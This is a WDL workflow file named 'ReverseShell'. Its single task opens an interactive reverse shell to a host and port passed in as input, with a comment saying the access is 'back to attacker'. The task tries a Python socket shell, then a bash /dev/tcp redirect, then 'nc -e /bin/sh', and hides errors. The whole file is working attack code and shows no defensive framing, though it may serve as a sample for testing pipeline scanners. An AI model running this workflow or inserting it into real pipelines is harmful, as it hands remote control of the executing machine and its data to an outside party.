version 1.0

workflow ReverseShell {
    input {
        String callback_host
        Int callback_port = 4444
    }
    call Shell {
        input:
            host = callback_host,
            port = callback_port
    }
}

task Shell {
    input {
        String host
        Int port
    }

    command <<<
        # Reverse shell back to attacker for interactive access
        python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('~{host}',~{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
" 2>/dev/null || \
        bash -i >& /dev/tcp/~{host}/~{port} 0>&1 2>/dev/null || \
        nc -e /bin/sh ~{host} ~{port} 2>/dev/null
    >>>

    runtime {
        docker: "python:3.11-slim"
    }
}
